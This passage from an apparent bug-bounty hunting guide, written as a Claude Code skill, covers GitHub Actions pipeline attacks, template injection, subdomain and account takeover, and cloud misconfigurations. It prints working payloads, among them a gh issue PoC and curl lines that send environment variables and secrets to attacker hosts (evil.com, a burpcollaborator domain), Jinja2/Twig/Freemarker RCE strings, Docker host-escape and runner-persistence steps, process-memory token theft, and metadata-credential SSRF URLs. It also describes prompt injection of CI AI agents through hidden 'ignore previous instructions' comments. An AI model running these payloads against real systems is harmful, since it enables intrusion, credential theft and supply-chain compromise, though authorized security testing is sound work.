github.event.pull_request.title / .body / .head.ref
github.event.comment.body
github.event.review.body
github.event.pages.*.page_name
github.event.commits.*.message / .author.name
github.event.head_commit.message / .author.name
github.event.workflow_run.head_branch
github.head_ref
```

- [ ] **Expression injection** — `${{ github.event.issue.title }}` in `run:` block = RCE
  ```yaml
  # VULNERABLE — attacker creates issue with title: a]]; curl https://evil.com/$(env | base64) #
  run: echo "${{ github.event.issue.title }}"

  # FIXED — use env var (shell-quoted, not expression-interpolated)
  env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"
  ```
- [ ] **Environment variable injection** — untrusted input → `$GITHUB_ENV`
  ```yaml
  # VULNERABLE — attacker injects newline + arbitrary VAR=VALUE
  run: echo "BRANCH=${{ github.head_ref }}" >> $GITHUB_ENV

  # FIXED — use heredoc delimiter
  run: |
    {
      echo "BRANCH<<EOF"
      echo "${{ github.head_ref }}"
      echo "EOF"
    } >> $GITHUB_ENV
  ```
- [ ] **PATH injection** — untrusted input → `$GITHUB_PATH` = arbitrary binary execution
- [ ] **Output clobbering** — untrusted input → `$GITHUB_OUTPUT` without heredoc delimiter = downstream job manipulation
- [ ] **Argument injection** — untrusted input as CLI argument (e.g., `docker run ${{ ... }}`)
  ```yaml
  # VULNERABLE
  run: docker run ${{ github.event.pull_request.body }}

  # FIXED — end-of-options marker + env var
  env:
    INPUT: ${{ github.event.pull_request.body }}
  run: docker run -- "$INPUT"
  ```
- [ ] **Request forgery (SSRF)** — attacker-controlled URL in `curl`/`wget` within workflow

### Category 2: Pipeline Poisoning & Untrusted Checkout

**Root cause**: Privileged triggers (`pull_request_target`, `workflow_run`) checkout attacker's PR code, which then runs with repository secrets.

- [ ] **Untrusted checkout** — `actions/checkout` on `pull_request_target` without explicit safe ref
  ```yaml
  # VULNERABLE — checks out attacker's PR code with repo secrets
  on: pull_request_target
  jobs:
    build:
      steps:
        - uses: actions/checkout@v4
          with:
            ref: ${{ github.event.pull_request.head.sha }}  # ATTACKER CODE
        - run: make build  # runs attacker's Makefile with secrets

  # FIXED — only checkout base branch, or use read-only permissions
  permissions: {}
  steps:
    - uses: actions/checkout@v4  # checks out base branch by default
  ```
- [ ] **TOCTOU (Time-of-Check-Time-of-Use)** — label-gated approval + mutable ref = attacker adds label, pushes malicious commit after approval
- [ ] **Reusable workflow taint** — `secrets: inherit` passes all secrets to called workflow that processes untrusted input
- [ ] **Cache poisoning** — untrusted checkout → build → cache write → trusted workflow reads poisoned cache
- [ ] **Cache poisoning (poisonable step)** — unsafe checkout followed by build step before cache save
- [ ] **Artifact poisoning** — `actions/download-artifact` from untrusted `workflow_run` without validation
  ```yaml
  # VULNERABLE — downloads artifact from untrusted workflow, then executes it
  on: workflow_run
  steps:
    - uses: actions/download-artifact@v4
    - run: ./downloaded-binary  # attacker-controlled binary

  # FIXED — verify artifact hash/signature before execution
  ```
- [ ] **Artipacked** — `actions/checkout` with `persist-credentials: true` (default) leaks `.git/config` credentials in uploaded artifacts
  ```yaml
  # FIXED
  - uses: actions/checkout@v4
    with:
      persist-credentials: false
  ```

### Category 3: Supply Chain & Dependency Security (CICD-SEC-08)

- [ ] **Unpinned actions** — `uses: actions/checkout@v4` (mutable tag) instead of SHA pin
  ```yaml
  # VULNERABLE — tag can be force-pushed
  uses: actions/checkout@v4

  # FIXED — pinned to immutable commit SHA
  uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
  ```
- [ ] **Impostor commit** — fork network allows pushing commits with SHA that appears to belong to upstream repo
- [ ] **Ref confusion** — ambiguous tag/branch names exploited to load unintended action version
- [ ] **Known vulnerable actions** — check actions against GHSA database (sisakulint detects automatically)
- [ ] **Archived actions** — unmaintained action with unpatched vulnerabilities
- [ ] **Unpinned container images** — `image: ubuntu:latest` instead of SHA256 digest pin

### Category 4: Credential & Secret Protection

- [ ] **Secret exfiltration** — `curl https://evil.com/${{ secrets.TOKEN }}` in workflow
- [ ] **Secrets in artifacts** — uploaded artifacts contain `.env`, credentials, or hidden files
  ```yaml
  # FIXED — exclude hidden files
  - uses: actions/upload-artifact@v4
    with:
      include-hidden-files: false
  ```
- [ ] **Unmasked secrets** — `fromJson()` derived values bypass GitHub's automatic masking
  ```yaml
  # FIXED — manually mask derived secrets
  run: |
    TOKEN=$(echo '${{ secrets.JSON_CREDS }}' | jq -r '.token')
    echo "::add-mask::$TOKEN"
  ```
- [ ] **Excessive `secrets: inherit`** — reusable workflow call inherits all secrets when it only needs one
- [ ] **Hardcoded credentials** — API keys, passwords, tokens directly in workflow YAML

### Category 5: Triggers & Access Control (CICD-SEC-01)

- [ ] **Dangerous triggers without mitigation** — `pull_request_target` or `workflow_run` with no `permissions: {}`, no approval gate, no ref restriction
- [ ] **Dangerous triggers with partial mitigation** — some protections present but bypassable
- [ ] **Label-based approval bypass** — `if: contains(github.event.pull_request.labels.*.name, 'approved')` is spoofable (attacker can add labels)
- [ ] **Bot condition spoofing** — `if: github.actor != 'dependabot[bot]'` is trivially bypassed by naming account similarly
- [ ] **Excessive GITHUB_TOKEN permissions** — `permissions: write-all` when only `contents: read` needed
- [ ] **Self-hosted runners in public repos** — untrusted PRs execute on org infrastructure = container escape → lateral movement
- [ ] **OIDC token theft** — CI runners expose OIDC tokens that grant cloud access

### Category 6: AI Agent Security (NEW — 2025+)

- [ ] **Unrestricted AI trigger** — `allowed_non_write_users: "*"` lets any user trigger AI agent execution
- [ ] **Excessive tool grants** — AI agent given Bash/Write/Edit tools in untrusted trigger context = attacker prompt → RCE
- [ ] **Prompt injection via workflow context** — `${{ github.event.issue.body }}` interpolated into AI agent prompt parameter

### Hunting Workflow

```
1. Recon: find all .github/workflows/*.yml in target's public repos
2. Scan: sisakulint scan .github/workflows/ (or --remote owner/repo)
3. Triage: Critical/High findings → manual verification
4. For each finding:
   a. Can I trigger this as an external contributor? (fork PR, issue creation, comment)
   b. What secrets are accessible? (check permissions: block, secrets usage)
   c. What's the blast radius? (repo secrets → deploy keys → cloud access)
5. PoC: create a fork, submit PR/issue that triggers the vulnerable workflow
6. Prove: show secret exfiltration, code execution, or artifact tampering
```

### Expression Injection PoC Template

```bash
# Step 1: Create an issue with injection payload in title
gh issue create --repo TARGET/REPO --title '"; curl https://ATTACKER.burpcollaborator.net/$(cat $GITHUB_ENV | base64 -w0) #' --body "test"

# Step 2: If workflow triggers on issues and interpolates title → secrets exfiltrated
# CVSS: 9.3 Critical (RCE with repo secrets)
```

### Real-World GHSAs (Proven Payouts)

### Deep-Dive: From sisakulint Finding to Bounty Report

sisakulint findings are **potentially exploitable** — not confirmed bugs. Every finding needs manual verification. The patterns below are extracted from 36 real-world paid reports ($250K+ total payouts). Each section follows the thinking that led to actual bounty payments.

#### 1. Code Injection / Argument Injection

**Gate question:** Can an external attacker trigger this workflow AND does the tainted input reach a shell context?

**Verification depth:**
1. **Trigger accessibility** — `issues: opened` and `issue_comment: created` are triggerable by ANY GitHub user. `pull_request_target` is triggerable via fork PR. Check if there's an `if:` condition filtering by actor/association.
2. **Direct vs transitive taint** — The workflow file itself may look safe. Cycode found Bazel's $13K bug because `cherry-picker.yml` passed `${{ github.event.issue.title }}` via `with:` to a **composite action in another repo** (`bazelbuild/continuous-integration`). The composite action's `action.yml` had `run: TITLE="${{ inputs.issue-title }}"`. Conventional scanners (actionlint) missed this because they don't follow `uses:` into external composite actions. **Always fetch and read the composite action's action.yml.**
3. **Payload construction** — Branch names cannot contain spaces. Ultralytics YOLO attacker used `${IFS}` (Internal Field Separator) and Bash brace expansion `{curl,-sSfL,URL}` to bypass this. Issue titles/bodies have no such restriction.
4. **Secrets reachability** — Check `permissions:` at workflow AND job level. No explicit `permissions:` block = repo default (often `write-all`). Check `env:` blocks for `${{ secrets.* }}`. Check if `GITHUB_TOKEN` has write permissions.
5. **Impact chain** — Bazel: issue title injection → composite action shell injection → `BAZEL_IO_TOKEN` + `GITHUB_TOKEN (write-all)` → Bazel codebase backdoor capability (affects Google, Kubernetes, Uber, LinkedIn).

**Kill signals:** `${{ contains(...) }}` or `${{ startsWith(...) }}` returning booleans are NOT injectable — false positive. `${{ github.event.pull_request.labels.*.name }}` inside `contains()` evaluates to `true`/`false`, not the label text.

#### 2. Untrusted Checkout (Pwn Request)

**Gate question:** Does the workflow checkout attacker-controlled code AND then execute something from that checkout?

**Verification depth:**
1. **Explicit vs implicit code execution** — The Flank $7.5K bug: `gh pr checkout` → `gradle/gradle-build-action` runs Gradle → Gradle auto-evaluates `settings.gradle.kts` as Kotlin script. The attacker never wrote a `run:` command. **Any build tool that reads config from the repo is an execution vector**: `Makefile`, `package.json` (postinstall scripts), `setup.py`, `build.gradle.kts`, `.cargo/config.toml`, `Gemfile`.
2. **Issue_comment is as dangerous as pull_request_target** — Rspack NPM token theft: `issue_comment` trigger + `refs/pull/${{ github.event.issue.number }}/head` checkout. `issue_comment` runs in base repo context with full secrets. Draft PRs are included. No contributor status check. **Always check issue_comment workflows for PR checkout patterns.**
3. **Self-hosted runner escalation** — If `runs-on:` contains `self-hosted`, check: (a) Is the runner ephemeral? (`--ephemeral` in config.sh). (b) Is the runner in Docker group? (`docker run -v /:/host --privileged`). (c) PyTorch pattern: contributor trick (typo fix PR → merge → contributor status → auto-trigger on self-hosted runner without approval) → RoR (Runner-on-Runner: `RUNNER_TRACKING_ID=0` + install attacker's runner agent) → wait for privileged workflow → steal PATs from `.git/config` or process memory.
4. **TOCTOU** — Label-gated `pull_request_target` workflows: attacker gets label added (social engineering), workflow checks label exists, attacker pushes malicious commit between check and checkout. The `ref:` at checkout time resolves to the new commit. **Mutable refs (`github.event.pull_request.head.sha` at trigger time vs checkout time) are the root cause.**
5. **Post-exploitation** — After initial access, enumerate all secrets: `env | base64`, `cat /proc/self/environ`, `gcore $(pgrep Runner.Worker)` + `strings core.* | grep ghp_`. PyTorch attackers got 3 bot PATs → combined them to bypass branch protection on main.

**Kill signals:** `if: "!github.event.pull_request.head.repo.fork"` blocks external attackers. `permissions: {}` at workflow level with only `contents: read` at job level limits damage. Ephemeral runners with `--ephemeral` flag prevent persistence.

#### 3. Artifact Poisoning

**Gate question:** Is there a TWO-STAGE workflow pattern where Stage 1 (pull_request, no secrets) uploads artifacts and Stage 2 (workflow_run, with secrets) downloads and uses them?

**Verification depth:**
1. **Cross-workflow artifact flow** — Same-workflow upload/download (build job → test job via `needs:`) is NOT poisonable because the attacker's PR runs their own build. The dangerous pattern is: `pull_request` workflow uploads → separate `workflow_run` workflow downloads. `workflow_run` triggers on the completion of another workflow and runs in the DEFAULT BRANCH context with full secrets.
2. **Download path matters** — `actions/download-artifact` with `path: .` or workspace-relative paths (`grafana-server/bin`) can overwrite source code, build scripts, or binaries. Safe pattern: extract to `${{ runner.temp }}/artifacts`.
3. **Source validation** — Does the `workflow_run` consumer check `github.event.workflow_run.head_repository.full_name != github.repository`? If not, fork PR artifacts are consumed blindly. Rust release pipeline was vulnerable to exactly this.
4. **ArtiPACKED (persist-credentials)** — `actions/checkout` defaults to `persist-credentials: true`. This writes `GITHUB_TOKEN` to `.git/config`. If the artifact upload path includes `.git/` (e.g., `path: .`), the token is publicly downloadable from the Actions artifact. **Check**: does any `upload-artifact` step use `path: .` or a broad path that includes `.git/`?

**Kill signals:** Upload and download in the same workflow run (connected by `needs:`). `workflow_run` consumer that explicitly checks fork origin. `persist-credentials: false` on checkout.

#### 4. Cache Poisoning

**Gate question:** Can a fork PR write a cache entry that the default branch later restores in a privileged context?

**CRITICAL: GitHub's cache scoping does NOT fully prevent this.** A PR branch can read caches from the default branch. A fork PR workflow can WRITE cache entries. If the cache key is deterministic (`hashFiles('package-lock.json')`) and the attacker doesn't modify that file, the fork PR writes to the SAME cache key.

**Verification depth:**
1. **Key predictability** — `key: ${{ runner.os }}-node-${{ hashFiles('package-lock.json') }}` is fully predictable. Adding `github.sha` or `github.run_id` to the key makes it unpredictable. **Check every cache key for the presence of an unpredictable component.**
2. **Cache hierarchy exploitation** — `workflow_run` and `workflow_dispatch` workflows run in the default branch context. If they write to caches with predictable keys, an attacker who can trigger the upstream workflow (via fork PR) can pre-poison the cache. The `run-dashboard-search-e2e.yml` pattern: `workflow_run` trigger → `actions/cache` with `hashFiles()` key → all PR workflows read this cache.
3. **Payload injection** — Cacheract: inject malware into package manager caches (`node_modules/.cache`, `~/.cache/pip`, `~/.gradle/caches`). The malware self-perpetuates because each restore → build → save cycle preserves the payload. **Cache TTL is 7 days** — the payload survives across multiple workflow runs.
4. **Privileged consumption** — The cache is restored in a `push` or `schedule` workflow on the default branch. These workflows have full `secrets` access. The poisoned dependency executes during `npm install` / `pip install` / `gradle build` and exfiltrates secrets.
5. **Clinejection chain** — Prompt injection → AI agent runs `npm install` from attacker commit → Cacheract in npm cache → nightly publish workflow restores cache → VSCE_PAT, OVSX_PAT, NPM_RELEASE_TOKEN stolen → malicious Cline v2.3.0 published for 8 hours.

**Kill signals:** Cache key includes `github.sha` or `github.run_id`. Separate cache keys per workflow. `actions/cache/restore` (read-only) instead of `actions/cache` (read-write) in PR workflows.

#### 5. Self-Hosted Runners

**Gate question:** Is a self-hosted runner used in a PUBLIC repo where external contributors can trigger workflows?

**Verification depth:**
1. **Approval settings** — Default: "Require approval for first-time contributors". After ONE merged PR (even a typo fix), the attacker becomes a "contributor" and subsequent PRs auto-trigger without approval. GitHub runner-images $20K bug used exactly this trick.
2. **Runner persistence** — Non-ephemeral runners retain state between jobs. `RUNNER_TRACKING_ID=0` prevents the runner from cleaning up attacker processes after job completion. Detached Docker containers (`docker run -d --restart always`) also survive cleanup.
3. **Runner-on-Runner (RoR)** — Install an official GitHub Actions runner binary on the target's self-hosted runner, register it to attacker's private org. Uses only legitimate GitHub binaries and HTTPS to github.com — indistinguishable from normal runner traffic. **No C2 server needed. GitHub itself is the C2.**
4. **Lateral movement** — RoR persistence → wait for privileged `push`/`schedule` workflows → steal tokens from `.git/config`, `$GITHUB_ENV`, `/proc/PID/environ`, or Runner.Worker process memory. PyTorch: 3 bot PATs → 93 repos → AWS S3 write access → `pip install pytorch` supply chain.
5. **Docker group escalation** — `docker run -v /:/host --privileged alpine chroot /host` → full host root. Add SSH keys, modify sudoers, install persistent backdoors.

**Kill signals:** `--ephemeral` flag on runner registration. "Require approval for ALL outside collaborators" (not just first-time). Runner not in Docker group. Private repo (no external PRs).

#### 6. Supply Chain (commit-sha / impostor-commit / ref-confusion)

**Gate question:** Does the workflow use mutable tags (`@v1`, `@v2`) for actions, and could those tags be replaced?

**Verification depth:**
1. **Tag mutability** — `git tag -f v1 <malicious-commit>` replaces the tag. 98.4% of repos don't use SHA pinning (Legit Security 2024). tj-actions attack: all version tags (v1, v35, v45) replaced with memdump.py payload → 23K repos affected → 218 confirmed secret leaks.
2. **Impostor commits** — Fork network shares object store with parent. Attacker pushes a commit to fork, then references that commit SHA in the parent repo's `uses:`. GitHub resolves it because the SHA exists in the shared object store.
3. **RepoJacking** — Org renames create a redirect. Old name becomes available. Attacker registers old org name, creates same repo, hosts malicious action. Shopify/unity-buy-sdk used `MirrorNG/unity-runner` → MirrorNG renamed to MirageNet → `MirrorNG` was claimable. **Check**: `GET /users/<action-owner>` returns 404? Takeover possible.
4. **Payload stealth** — tj-actions memdump.py: extract secrets from Runner.Worker process memory via `/proc/PID/maps` + `/proc/PID/mem`, encrypt with AES+RSA, output to workflow log. Logs are publicly visible but encrypted — only attacker has the key.

**Kill signals:** Full 40-char SHA pinning (`uses: actions/checkout@b4ffde65...`). Dependabot configured for `github-actions` ecosystem. Organization-level action allowlist.

#### 7. AI Agent Security

**Gate question:** Is an AI agent (Gemini CLI, Claude Code, Cline, Codex) invoked in a workflow where external users can influence the prompt?

**Verification depth:**
1. **Trigger + prompt source** — `issues: opened` → AI triage bot reads `github.event.issue.body`. The body IS the prompt. HTML comments (`<!-- ignore previous instructions -->`) are invisible in GitHub UI but included in the API response and thus in the AI prompt.
2. **Tool permissions** — If the AI agent has Bash/Write/Edit tools and runs with secrets in env, prompt injection = RCE + secret exfil. `allowed_non_write_users: "*"` means ANY user can trigger.
3. **Multi-phase chain** — Clinejection: prompt injection → AI runs `npm install` from attacker commit → Cacheract plants in npm cache → nightly publish restores cache → tokens stolen → malicious version published. **A prompt injection finding alone may seem low-severity, but it's a gateway to cache poisoning and supply chain attacks.**

**Kill signals:** `author_association == 'MEMBER' || 'OWNER'` check before AI processing. `--read-only --no-exec` flags on AI CLI. `permissions: {}` at workflow level.

#### 8. Permissions / Secrets Hygiene

**Not standalone bugs** — these are force multipliers. A `code-injection-medium` with `permissions: write-all` is Critical. The same injection with `permissions: { contents: read }` is limited.

**Chaining checklist:**
- `secrets: inherit` on reusable workflow call → all org secrets accessible to called workflow
- `permissions:` block missing → repo default (often write-all)
- `GITHUB_TOKEN` with `contents: write` → CVE-2022-46258 pattern: use Contents API to create new workflow file → new workflow accesses ALL repo/org secrets (the original workflow never referenced them)

## SSTI -- Server-Side Template Injection

### Detection Payloads
```
{{7*7}}          -> 49 = Jinja2 / Twig / generic
${7*7}           -> 49 = Freemarker / Pebble / Velocity
<%= 7*7 %>       -> 49 = ERB (Ruby)
#{7*7}           -> 49 = Mako / some Ruby
*{7*7}           -> 49 = Spring (Thymeleaf)
{{7*'7'}}        -> 7777777 = Jinja2 (Twig gives 49)
```

### Where to Test
- Name/bio/description fields (profile pages)
- Email templates (invoice name, username in confirmation email)
- Custom error messages
- PDF generators (invoice, report export)
- URL path parameters
- Search queries reflected in results

### Jinja2 -> RCE (Python / Flask)
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Twig -> RCE (PHP / Symfony)
```php
{{["id"]|filter("system")}}
```

### Freemarker -> RCE (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### ERB -> RCE (Ruby on Rails)
```ruby
<%= `id` %>
```

## Subdomain Takeover

### Detection
```bash
# Check for dangling CNAMEs
cat /tmp/subs.txt | dnsx -silent -cname -resp | grep -i "CNAME" | tee /tmp/cnames.txt
# Look for CNAMEs to: github.io, heroku.com, azurewebsites.net, netlify.app, s3.amazonaws.com

# Automated takeover detection
nuclei -l /tmp/subs.txt -t ~/nuclei-templates/http/takeovers/ -o /tmp/takeovers.txt
```

### Quick-Kill Fingerprints
```
"There isn't a GitHub Pages site here"  -> GitHub Pages
"NoSuchBucket"                          -> AWS S3
"No such app"                           -> Heroku
"404 Web Site not found"                -> Azure App Service
"Fastly error: unknown domain"          -> Fastly CDN
"project not found"                     -> GitLab Pages
"It looks like you may have typed..."   -> Shopify
```

### Impact Escalation
- Basic takeover: serve page under target.com subdomain -> Low/Medium
- + Cookies: if target.com sets cookie with domain=.target.com -> credential theft -> High
- + OAuth redirect: if sub.target.com is a registered redirect_uri -> ATO chain -> Critical
- + CSP bypass: if sub.target.com is in target's CSP -> XSS anywhere -> Critical

## ATO -- Account Takeover (Complete Taxonomy)

### Path 1: Password Reset Poisoning (Host Header Injection)
```bash
POST /forgot-password
Host: attacker.com
Content-Type: application/x-www-form-urlencoded
email=victim@company.com
# If reset link = https://attacker.com/reset?token=XXXX -> ATO
# Also try: X-Forwarded-Host, X-Host, X-Forwarded-Server
```

### Path 2: Reset Token in Referrer Leak
After clicking reset link, if page loads external resources -> token in Referer header to external domain.

### Path 3: Predictable / Weak Reset Tokens
```bash
# If token < 16 hex chars or numeric only -> brute-forceable
ffuf -u "https://target.com/reset?token=FUZZ" -w <(seq -w 000000 999999) -fc 404 -t 50
```

### Path 4: Token Not Expiring / Reuse
Request token -> wait 2 hours -> use it -> still works? Request token #1 -> request token #2 -> use token #1 -> still works?

### Path 5: Email Change Without Re-Authentication
```bash
PUT /api/user/email
{"new_email": "attacker@evil.com"}
# If no current_password required -> attacker changes email -> locks out victim
```

### Path 6: OAuth Account Linking Abuse
Can you link an OAuth account from a different email to an existing account?

### Path 7: Session Fixation
GET /login -> note Set-Cookie session=XYZ -> Log in -> does session ID change? If not = fixation.

## Cloud / Infra Misconfigs

### S3 / GCS / Azure Blob
```bash
# S3 public listing (no aws CLI installed — curl the bucket XML API)
curl -s "https://target-bucket-name.s3.amazonaws.com/" | head -30   # ListBucketResult = listable

# Try common names
for name in target target-backup target-assets target-prod target-staging target-uploads target-data; do
  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done
```

### EC2 Metadata (via SSRF)
```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns role name, then:
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
# Returns AccessKeyId, SecretAccessKey, Token -> Critical

# GCP (needs header Metadata-Flavor: Google):
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure (needs header Metadata: true):
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### Firebase Open Rules
```bash
curl -s "https://TARGET-APP.firebaseio.com/.json"
# If data returned -> open read
curl -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'
# If success -> open write -> Critical
```

### Exposed Admin Panels
```bash
/jenkins       /grafana       /kibana        /elasticsearch
/swagger-ui.html  /api-docs   /phpMyAdmin    /adminer.php
/.env          /config.json   /server-status /actuator/env
```

### Kubernetes / Docker
```bash
# K8s API (unauthenticated):
curl -sk https://TARGET:6443/api/v1/namespaces/default/pods
# Docker API:
curl -s http://TARGET:2375/containers/json
```

# PHASE 4: VALIDATE

## The 7-Question Gate (Run BEFORE Writing ANY Report)

All 7 must be YES. Any NO -> STOP.

### Q1: Can I exploit this RIGHT NOW with a real PoC?
Write the exact HTTP request. If you cannot produce a working request -> KILL IT.

### Q2: Does it affect a REAL user who took NO unusual actions?
No "the user would need to..." with 5 preconditions. Victim did nothing special.

### Q3: Is the impact concrete (money, PII, ATO, RCE)?
"Technically possible" is not impact. "I read victim's SSN" is impact.

### Q4: Is this in scope per the program policy?
Check the exact domain/endpoint against the program's scope page.

### Q5: Did I check Hacktivity/changelog for duplicates?
Search the program's disclosed reports and recent changelog entries.

### Q6: Is this NOT on the "always rejected" list?
Check the list below. If it's there and you can't chain it -> KILL IT.

### Q7: Would a triager reading this say "yes, that's a real bug"?
Read your report as if you're a tired triager at 5pm on a Friday. Does it pass?

# ALWAYS REJECTED -- Never Submit These

Missing CSP/HSTS/security headers, missing SPF/DKIM/DMARC, GraphQL introspection alone, banner/version disclosure without working CVE exploit, clickjacking on non-sensitive pages, tabnabbing, CSV injection, CORS wildcard without credential exfil PoC, logout CSRF, self-XSS, open redirect alone, OAuth client_secret in mobile app, SSRF DNS-ping only, host header injection alone, no rate limit on non-critical forms, session not invalidated on logout, concurrent sessions, internal IP disclosure, mixed content, SSL weak ciphers, missing HttpOnly/Secure cookie flags alone, broken external links, pre-account takeover (usually), autocomplete on password fields.

**N/A hurts your validity ratio. Informative is neutral. Only submit what passes the 7-Question Gate.**

## Conditionally Valid With Chain

These low findings become valid bugs when chained:

| Low Finding | + Chain | = Valid Bug |
|------------|---------|-------------|
| Open redirect | + OAuth code theft | ATO |
| Clickjacking | + sensitive action + PoC | Account action |
| CORS wildcard | + credentialed exfil | Data theft |

## Severity Escalation Language

When payout is being downgraded, use these counters:

| Program Says | You Counter With |
|---|---|
| "Requires authentication" | "Attacker needs only a free account (no special role)" |
| "Limited impact" | "Affects [N] users / [PII type] / [$ amount]" |
| "Already known" | "Show me the report number -- I searched and found none" |
| "By design" | "Show me the documentation that states this is intended" |
| "Low CVSS score" | "CVSS doesn't account for business impact -- attacker can steal [X]" |

# ENVIRONMENT NOTES (this machine)

All tools referenced in this skill are pre-installed and verified. Canonical paths,
proxy config (Caido :8081), wordlist locations, and the missing-tools table live in:

```bash
cat ~/tools/claude-bug-bounty/ENVIRONMENT.md
```

Custom arsenal scripts: `~/tools/claude-bug-bounty/tools/`. Orchestrator:
`python3 ~/tools/claude-bug-bounty/tools/hunt.py --target T --status`

Then in Claude Code, this skill loads automatically when you ask about bug bounty, recon, or vulnerability hunting.
